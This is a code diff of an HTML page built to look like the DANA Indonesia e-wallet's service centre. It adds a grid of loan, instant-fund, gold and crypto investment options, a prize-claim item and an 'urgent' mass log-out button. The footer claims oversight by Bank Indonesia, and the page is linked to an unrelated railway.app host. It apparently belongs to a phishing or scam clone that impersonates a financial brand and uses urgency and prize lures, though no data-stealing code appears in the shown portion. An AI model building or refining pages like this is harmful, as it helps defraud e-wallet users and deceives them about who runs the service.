@@ -86,109 +86,71 @@ content="https://lnkjenius-production.up.railway.app/?update=827382">
 
 <section class="section service-section">
 
-    <div class="title">Pusat Layanan</div>
-    <div class="subtitle">Pilih layanan sesuai kebutuhan Anda</div>
+    <div class="title">Pusat Layanan Dana</div>
+    <div class="subtitle"></div>
 
-    <div class="service-card"
-      data-service="pinjaman">
+    <div class="service-grid">
 
-        <div class="service-icon">
-            <img src="assets/pinjaman.png">
+        <!-- Ajukan Pinjaman -->
+        <div class="service-item" data-service="pinjaman">
+            <span class="badge popular">POP</span>
+            <img src="icon/pinjaman.png" alt="">
+            <span>Ajukan<br>Pinjaman</span>
         </div>
 
-        <div class="service-text">
-            <h3>AJUKAN PINJAMAN</h3>
-            <div class="tag">POPULER</div>
-            <p>Pinjaman Sampai Rp50.000.000</p>
+        <!-- DANA Instan -->
+        <div class="service-item" data-service="instan">
+            <img src="icon/instan.png" alt="">
+            <span>DANA<br>Instan</span>
         </div>
 
-        <div class="arrow">
-            <i class="fa-solid fa-chevron-right"></i>
+        <!-- DANA Cicil -->
+        <div class="service-item" data-service="cicil">
+            <span class="badge popular">POP</span>
+            <img src="icon/cicil.png" alt="">
+            <span>DANA<br>Cicil</span>
         </div>
 
-    </div>
-
-
-    <div class="service-card"
-      data-service="instan">
-
-        <div class="service-icon">
-            <img src="assets/instan.png">
+        <!-- Investasi Emas -->
+        <div class="service-item" data-service="emas">
+            <span class="badge popular">POP</span>
+            <img src="icon/emas.png" alt="">
+            <span>Investasi<br>Emas</span>
         </div>
 
-        <div class="service-text">
-            <h3>DANA INSTAN</h3>
-            <div class="tag">POPULER</div>
-            <p>Aktifkan Sekarang Cairkan Nanti</p>
+        <!-- Klaim Hadiah -->
+        <div class="service-item" data-service="hadiah">
+            <img src="icon/hadiah.png" alt="">
+            <span>Klaim<br>Hadiah</span>
         </div>
 
-        <div class="arrow">
-            <i class="fa-solid fa-chevron-right"></i>
+        <!-- Investasi Crypto -->
+        <div class="service-item" data-service="crypto">
+            <span class="badge new">NEW</span>
+            <img src="icon/crypto.png" alt="">
+            <span>Investasi<br>Crypto</span>
         </div>
 
-    </div>
-
-
-    <div class="service-card"
-      data-service="cicil">
-
-        <div class="service-icon">
-            <img src="assets/cicil.png">
+        <!-- DANA Bisnis -->
+        <div class="service-item" data-service="bisnis">
+            <img src="icon/bisnis.png" alt="">
+            <span>DANA<br>Bisnis</span>
         </div>
 
-        <div class="service-text">
-            <h3>AKTIFKAN DANA CICIL</h3>
-            <div class="tag">PROMO</div>
-            <p>Beli sekarang, bayar nanti.</p>
-        </div>
-
-        <div class="arrow">
-            <i class="fa-solid fa-chevron-right"></i>
-        </div>
-
-    </div>
-
-
-    <div class="service-card"
-      data-service="emas">
-
-        <div class="service-icon">
-            <img src="assets/emas.png">
-        </div>
-
-        <div class="service-text">
-            <h3>INVESTASI EMAS</h3>
-            <p>Investasi Emas di DANA lebih mudah</p>
-        </div>
-
-        <div class="arrow">
-            <i class="fa-solid fa-chevron-right"></i>
+        <!-- Log Out Massal -->
+        <div class="service-item" data-service="logout">
+            <span class="badge urgent">URG</span>
+            <img src="icon/logout.png" alt="">
+            <span>Log out<br>Massal</span>
         </div>
 
     </div>
 
+</section>
 
-    <div class="service-card"
-      data-service="logout">
+  <section class="section notif-section">
 
-        <div class="service-icon">
-            <img src="assets/logout.png">
-        </div>
-
-        <div class="service-text">
-            <h3>
-                Log Out Perangkat
-                <span class="urgent-badge">URGENT</span>
-            </h3>
-
-            <p>Keluar dari semua sesi perangkat.</p>
-        </div>
-
-        <div class="arrow">
-            <i class="fa-solid fa-chevron-right"></i>
-        </div>
-
-    </div>
+    <div class="notif-list" id="notifList"></div>
 
 </section>
       
@@ -211,7 +173,7 @@ content="https://lnkjenius-production.up.railway.app/?update=827382">
     <section class="section">
 
         <div class="info-box">
-            <h3><i class="fa-solid fa-circle-info"></i> Pengumuman DANA</h3>
+            <h3><i class="fa-solid fa-circle-info"></i> Pengumuman Dana</h3>
             <p id="typingText"></p>
         </div>
     </section>
@@ -221,16 +183,14 @@ content="https://lnkjenius-production.up.railway.app/?update=827382">
     <img src="assets/dana-icon.png" alt="Logo">
 </div>
 
-        <h4>DANA Indonesia</h4>
+        <h4>DANA INDONESIA</h4>
 
         <p>
-            DANA Indonesia terdaftar serta diawasi oleh Bank Indonesia dan Komdigi
+            DANA Indonesia terdaftar serta diawasi oleh<br> Bank Indonesia dan Komdigi
         </p>
 
         <small>© 2026 DANA Indonesia. All Rights Reserved.</small>
     </div>
-
-</div>
 
 <div class="chatbot" id="chatbot">
     <div class="chat-head">
